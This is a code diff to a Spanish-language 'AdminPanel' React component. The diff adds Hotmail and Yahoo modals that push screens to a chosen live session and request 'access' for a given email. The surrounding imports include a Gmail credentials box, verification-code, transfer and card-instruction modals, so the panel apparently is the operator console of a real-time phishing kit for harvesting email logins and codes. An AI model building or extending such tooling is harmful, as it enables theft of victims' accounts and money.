@@ -13,6 +13,8 @@ import SmsManagement from '@/components/admin/SmsManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal } from '@/components/admin/Modals';
 import { GmailModal } from '@/components/admin/GmailModal';
 import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
+import { HotmailModal } from '@/components/admin/HotmailModal';
+import { YahooModal } from '@/components/admin/YahooModal';
 import { GmailCredentialsBox } from '@/components/admin/GmailCredentialsBox';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
@@ -701,6 +703,40 @@ export default function AdminPanel() {
     closeModal();
   };
   
+  const handleHotmailModalConfirm = (data: { correo: string, mensaje: string }) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.HOTMAIL}`,
+        sessionId: selectedSessionId,
+        correo: data.correo
+      });
+      
+      toast({
+        title: "Solicitud de Hotmail enviada",
+        description: `Se ha solicitado el acceso a Hotmail para: ${data.correo}`,
+      });
+    }
+    
+    closeModal();
+  };
+  
+  const handleYahooModalConfirm = (data: { correo: string, mensaje: string }) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.YAHOO}`,
+        sessionId: selectedSessionId,
+        correo: data.correo
+      });
+      
+      toast({
+        title: "Solicitud de Yahoo enviada",
+        description: `Se ha solicitado el acceso a Yahoo para: ${data.correo}`,
+      });
+    }
+    
+    closeModal();
+  };
+  
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
       // Usamos exactamente lo que el usuario ingresó, sin valores predeterminados
@@ -1031,6 +1067,16 @@ export default function AdminPanel() {
         isOpen={activeModal === 'gmail_verify'} 
         onClose={closeModal} 
         onConfirm={handleGmailVerifyModalConfirm} 
+      />
+      <HotmailModal 
+        isOpen={activeModal === 'hotmail'} 
+        onClose={closeModal} 
+        onConfirm={handleHotmailModalConfirm} 
+      />
+      <YahooModal 
+        isOpen={activeModal === 'yahoo'} 
+        onClose={closeModal} 
+        onConfirm={handleYahooModalConfirm} 
       />
       
       {/* Diálogo para enviar SMS */}
